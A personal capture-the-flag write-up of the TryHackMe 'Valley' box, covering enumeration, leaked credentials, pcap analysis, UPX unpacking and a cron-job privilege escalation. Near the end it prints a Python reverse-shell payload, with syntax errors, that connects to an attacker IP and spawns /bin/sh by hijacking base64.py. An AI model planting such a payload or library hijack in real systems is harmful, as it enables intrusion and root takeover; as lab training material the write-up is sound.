---

Title: "Valley — TryHackMe Writeup"
Author: Cankun Wang
date: 2025-11-20
tags: [tryhackme, writeup]

---

#Task

Boot the box and find a way in to escalate all the way to root!

#Scan

We start with a normal nmap scan for all ports.

![](assets/2025-11-19-23-07-58-image.png)

And now let's take a look at the target website.

![](assets/2025-11-19-23-09-13-image.png)

We have already take a look at the target website, as well as the pricing and gallery part.

However, there are nothing interesting here. 

Let's keep using gobuster to fuzz the possible directory.

![](assets/2025-11-19-23-18-18-image.png)

![](assets/2025-11-19-23-18-30-image.png)

I didn't save the output because this is my second time doing this, so I know it is not necessary to save the output here.

We find three directories here. Let's first start with /static

![](assets/2025-11-19-23-20-58-image.png)

It should have something there, let's dive deeper.(we have already view the /pricing and /gallery and nothing find there)

![](assets/2025-11-19-23-29-43-image.png)

![](assets/2025-11-19-23-29-55-image.png)

Let's take a look at these directories. 

The /00 directory has a valuable info here.

![](assets/2025-11-19-23-30-40-image.png)

 we find another directory.Now, let's take a look at this directory.

![](assets/2025-11-19-23-35-37-image.png)

A login page, but we need a credential.

Let's view the source code.

![](assets/2025-11-19-23-38-19-image.png)

There are two files listed here. First, dev.js is a nice point for us to enumerate. Let's take a look. (button.js is useless, is only a listener of button)

![](assets/2025-11-19-23-40-35-image.png)

![](assets/2025-11-19-23-40-45-image.png)

We find a credential here. Now we have an access point to the target.

Also, there is a txt file here.

![](assets/2025-11-19-23-43-22-image.png)

Let's read this file.

![](assets/2025-11-19-23-45-42-image.png)

It provides some valuable info. We can try to reuse the credentials and use ftp to access the target.

#Exploit

First, let's try the ssh login.

![](assets/2025-11-19-23-47-20-image.png)

ssh is not allowed.

Now let's try the ftp.(Remember we are using 37370 port instead of 21)

![](assets/2025-11-19-23-48-48-image.png)

ftp success.

![](assets/2025-11-19-23-50-40-image.png)

We have three pcapng files here. Let's download these files and use wireshark to analyze it.

![](assets/2025-11-19-23-53-02-image.png)

With using wireshark to analyze the three files, we finally find a post request that has the credential.

![](assets/2025-11-19-23-56-25-image.png)

We successfully login as valleyDev.

![](assets/2025-11-19-23-58-41-image.png)

Now we have the flag.

#Escalation priviledge

![](assets/2025-11-19-23-59-37-image.png)

sudo is denied. Let's check others.

![](assets/2025-11-20-00-04-24-image.png)

We want to view all the tasks that are running. 

![](assets/2025-11-20-00-05-21-image.png)

We noticed that there is python3 and crontab. It reminds us to check the crontab.

![](assets/2025-11-20-00-06-05-image.png)

We find that there is a python script running.

Let's view the content of this script.

![](assets/2025-11-20-00-07-30-image.png)

It imports base64, which could be useful for us. 

![](assets/2025-11-20-00-09-07-image.png)

However, we can't write it. 

![](assets/2025-11-20-00-14-01-image.png)

We also don't have the access to write in base64.py, which means we can't hijacking the base64

Now we may need to do a horizontal moving to find a user that has the right to write in the directory.

![](assets/2025-11-20-00-16-30-image.png)

There is a user called valley, and a file called valleyAuthenticator which we can run.

Let's run this file.

![](assets/2025-11-21-15-18-40-image.png)

It looks like a authentication center, but we don't know the password of valley. Let's login as valleyDev.

![](assets/2025-11-21-15-20-15-image.png)

Also failed. 

Can we have a look at the content of this file?

It is a quite large file that we can't open it at terminal. Let's download it and take a look.

We can use strings to analyze the file.

![](assets/2025-11-21-15-36-05-image.png)

For the first part of the beginning, we find a valid info---UPX.

Let's keep reading.

Nothing else there. SO now we can try UPX to unzip the file.

---

upx -d filename

---

After unzip the file, let's view it.

![](assets/2025-11-21-15-43-10-image.png)

![](assets/2025-11-21-15-53-28-image.png)

We find two long hashes(?) before the welcome sentence. (I am not sure that is hash but it looks like it is)

Maybe try to crack it will help us.

![](assets/2025-11-21-15-55-15-image.png)

![](assets/2025-11-21-15-55-47-image.png)

We are correct. This is the credential of valley.

Now we can login as valley.

---

import base64
import socket,subprocess,os 
import pty 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
s.connect((192.168.128.213,8000)) 
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1;
os.dup2(s.fileno(),2) 
pty.spawn("/bin/sh")

---

(Remember change the ip and port number)

We will write this into base64.py to hijack it.

![](assets/2025-11-21-16-04-54-image.png)

Then we start a listener.

![](assets/2025-11-21-16-10-28-image.png)

Now we are root.

Thanks for reading!


